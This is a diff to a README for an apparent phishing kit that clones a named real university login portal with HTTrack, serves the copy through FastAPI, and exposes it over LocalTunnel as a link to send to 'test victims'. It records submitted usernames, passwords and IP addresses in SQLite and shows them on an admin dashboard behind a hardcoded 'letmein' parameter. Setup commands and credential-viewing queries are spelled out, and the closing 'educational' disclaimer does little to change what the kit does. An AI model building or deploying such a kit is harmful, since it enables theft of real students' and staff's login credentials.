@@ -64,17 +64,17 @@ From the HTTrack result:
 
 📁 Static Assets Setup:
 
-After cloning the portal using HTTrack, you'll find the static assets in:
-   "/home/evidence/eksuportal.eksu.edu.ng/assets_ajax/"
+     After cloning the portal using HTTrack, you'll find the static assets in:
+     "/home/evidence/eksuportal.eksu.edu.ng/assets_ajax/"
    
-To ensure the login.html page properly loads CSS, JavaScript, and image files in your 
-FastAPI project, move the following subdirectories into the FastAPI static folder:
+     To ensure the login.html page properly loads CSS, JavaScript, and image files in your 
+     FastAPI project, move the following subdirectories into the FastAPI static folder:
 
-# Move these folders using the 'mv' command.
-mv /cloned_portal_path/assets_ajax/css      /home/project_directory/app/static/app/static/
-mv /cloned_portal_path/assets_ajax/js       /home/project_directory/app/static/
-mv /cloned_portal_path/assets_ajax/img      /home/project_directory/app/static/
-mv /cloned_portal_path/assets_ajax/plugins  /home/project_directory/app/static/
+    # Move these folders using the 'mv' command.
+    mv /cloned_portal_path/assets_ajax/css      /home/project_directory/app/static/app/static/
+    mv /cloned_portal_path/assets_ajax/js       /home/project_directory/app/static/
+    mv /cloned_portal_path/assets_ajax/img      /home/project_directory/app/static/
+    mv /cloned_portal_path/assets_ajax/plugins  /home/project_directory/app/static/
 
 
 ✅ Ensure the directory structure under /home/project_directory/app/static/ looks like:
@@ -90,7 +90,7 @@ This allows your login.html to correctly reference styles and scripts without br
 
 ### 3. Build a FastAPI Backend.
 
-A simple FastAPI server is used to:
+    A simple FastAPI server is used to:
 
     Receive POST requests from the login form (/login)
 
@@ -113,11 +113,38 @@ A simple FastAPI server is used to:
 
     
 ### 5. Expose Your Server Publicly
-instead of using Ngrok or cloudflare (banned), this project uses LocalTunnel(Though can we changed in the future),:
-It generates a public HTTPS link (e.g., https://yourname.loca.lt) that can be sent to test victims or shown in demos.
-And required a password which can be get using " curl https://loca.lt/mytunnelpassword " OR " https://loca.lt/mytunnelpassword" OR "wget -q -O - https://loca.lt/mytunnelpassword" 
+       instead of using Ngrok or cloudflare (banned), this project uses LocalTunnel(Though can we changed in the future),:
+      It generates a public HTTPS link (e.g., https://yourname.loca.lt) that can be sent to test victims or shown in demos.
+      And required a password which can be get using " curl https://loca.lt/mytunnelpassword 
+    " OR " https://loca.lt/mytunnelpassword" OR "wget -q -O - https://loca.lt/mytunnelpassword" 
 
+### 6. 🔐 Admin Panel/Dashboard
+       The Admin Dashboard provides a secure interface to view all submitted login credentials
+       captured through the cloned portal. It displays a table with each record’s:
 
+       Username and password (as submitted)
+
+      Timestamp of submission
+
+      IP address of the user
+
+      This tool allows administrators or penetration testers to monitor login attempts
+      in real time for analysis and educational research.
+      
+      Visit " http://localhost:8000/admin?auth=letmein" to access the admin dashboard
+      
+
+### 7. ✅ IP Address Logging Summary
+
+      The system automatically logs the IP address of every user that submits the login form. This feature:
+
+      Captures the client IP using request.client.host
+
+      Stores the IP alongside the submitted credentials and timestamp
+
+      Helps track where requests are originating from (e.g., local vs external devices)
+
+      This logging supports auditing and analysis of network sources involved in testing scenarios.
 
 
 Project_Directory/
@@ -144,16 +171,52 @@ Project_Directory/
       " lt --port 8000 --subdomain eksu-portal" (TO BE RUN IN ANOTHER TAB OR TERMINAL)
       then you receive a public link.
 
-💾 View Captured Data
-      To inspect the database:
-      " sqlite3 app/db/credentials.db "
+💾 View Captured Data:
+     You can view user captured data via two methods
+      ** Admin DashBoard
+      ** Sqlite3 Database
       
-   Then inside SQLite shell:
-      " .tables "
-       " SELECT * FROM credentials; "
+      To inspect via the database:
+         " sqlite3 app/db/credentials.db "
+      
+          Then inside SQLite shell:
+            " .tables "
+           " SELECT * FROM credentials;".
+           
+      To inspect via Admin dashboard:
+         after running your code;
+           Visit " http://localhost:8000/admin?auth=letmein" to access the admin dashboard.
        
-       
-  
+  🤝 Contributing
+
+We welcome contributions from developers, ethical hackers, and cybersecurity enthusiasts
+ who are passionate about educational tools and research-driven development.
+
+Whether you want to:
+
+    Improve the admin dashboard interface
+
+    Extend features like IP tracking, device fingerprinting, or real-time monitoring
+
+    Add authentication, logging, or data visualization
+
+    Refactor the backend for performance or scalability
+
+    Help with documentation or translations
+
+Your input is highly appreciated!
+
+To contribute:
+
+    Fork the repository
+
+    Create a new branch for your feature or fix
+
+    Commit your changes with clear messages
+
+    Open a pull request — we’ll review and discuss it together
+
+    This project is built for ethical, educational, and research purposes only. Let’s collaborate responsibly.
   
   
   ✅ Features
@@ -167,6 +230,10 @@ Project_Directory/
     ✅ LocalTunnel for public demo access
 
     ✅ Managed using Poetry
+    
+    ✅ 🌐 IP Address logging
+    
+    ✅ 🧑‍💼 Admin dashboard to view submitted credentials
 
 
  ⚠️ Legal & Ethical Notice
